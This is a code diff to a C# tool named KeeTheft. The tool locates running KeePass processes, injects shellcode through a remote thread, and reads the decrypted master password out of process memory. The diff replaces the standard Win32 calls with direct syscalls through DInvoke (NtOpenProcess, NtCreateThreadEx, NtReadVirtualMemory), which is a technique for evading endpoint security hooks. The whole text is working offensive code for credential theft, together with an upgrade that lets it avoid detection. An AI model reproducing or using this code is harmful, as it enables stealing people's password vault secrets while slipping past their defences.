@@ -1,18 +1,22 @@
 ﻿using System;
-using System.Collections.Generic;
-using Microsoft.Diagnostics.Runtime;
-using System.Diagnostics;
 using System.Threading;
+using System.Management;
+using System.Diagnostics;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using Microsoft.Diagnostics.Runtime;
 using KeeTheft.Extensions;
 using KeeTheft.KeyInfo;
-using System.Management;
+
+using DI = DInvoke;
 
 namespace KeeTheft
 {
-    static class Program
+    public static class Program
     {
         public static ILogger Logger = new NullLogger();
-        static void Main(string[] args)
+
+        public static void Main(string[] args)
         {
             //Logger = new ConsoleLogger();
             Process[] Processes = Process.GetProcessesByName("keepass");
@@ -100,10 +104,12 @@ namespace KeeTheft
             if (CompositeKeys.Count > 0)
             {
                 IntPtr ProcessHandle = IntPtr.Zero;
+                Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
+                Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)Proc.Id };
+
                 try
                 {
-                    ProcessHandle = Win32.OpenProcess(Win32.ProcessAccessFlags.All, false, Proc.Id);  // 0x001F0FFF = All
-                    if (ProcessHandle == IntPtr.Zero)
+                    if (Syscalls.NtOpenProcess(ref ProcessHandle, DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, ref oa, ref ci) != 0)
                     {
                         Logger.WriteLine("Error: Couldn't get a handle to process. PID: " + Proc.Id);
                     }
@@ -146,8 +152,7 @@ namespace KeeTheft
                 IntPtr ShellcodeAddr = Win32.AllocateRemoteBuffer(ProcessHandle, Shellcode);
 
                 IntPtr ThreadId = IntPtr.Zero;
-                IntPtr RemoteThreadHandle = Win32.CreateRemoteThread(ProcessHandle, IntPtr.Zero, 0, ShellcodeAddr, IntPtr.Zero, 0, out ThreadId);
-                if (RemoteThreadHandle == IntPtr.Zero)
+                if (Syscalls.NtCreateThreadEx(ref ThreadId, DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, ProcessHandle, ShellcodeAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) != 0)
                 {
                     Logger.WriteLine("Error: Could not create a thread for the shellcode");
                     return;
@@ -155,14 +160,18 @@ namespace KeeTheft
 
                 // Read plaintext password!
                 Thread.Sleep(1000);
-                IntPtr NumBytes;
-                byte[] plaintextBytes = new byte[key.encryptedBlob.Length];
-                int res = Win32.ReadProcessMemory(ProcessHandle, EncryptedBlobAddr, plaintextBytes, plaintextBytes.Length, out NumBytes);
-                if (res != 0 && NumBytes.ToInt64() == plaintextBytes.Length)
+                IntPtr pPlaintextBytes = Marshal.AllocHGlobal(key.encryptedBlob.Length);
+
+                uint NumBytes = 0;
+                if (Syscalls.NtReadVirtualMemory(ProcessHandle, EncryptedBlobAddr, pPlaintextBytes, (uint)key.encryptedBlob.Length, ref NumBytes) == 0 && NumBytes == key.encryptedBlob.Length)
                 {
+                    byte[] plaintextBytes = new byte[NumBytes];
+                    Marshal.Copy(pPlaintextBytes, plaintextBytes, 0, (int)NumBytes);
                     key.plaintextBlob = plaintextBytes;
                     Logger.WriteLine(key);
                 }
+
+                Marshal.FreeHGlobal(pPlaintextBytes);
 
                 // Dunno why, but VirtualFree was causing crashes...
                 // Thread.Sleep(4000);  // Wait for the shellcode to finish executing
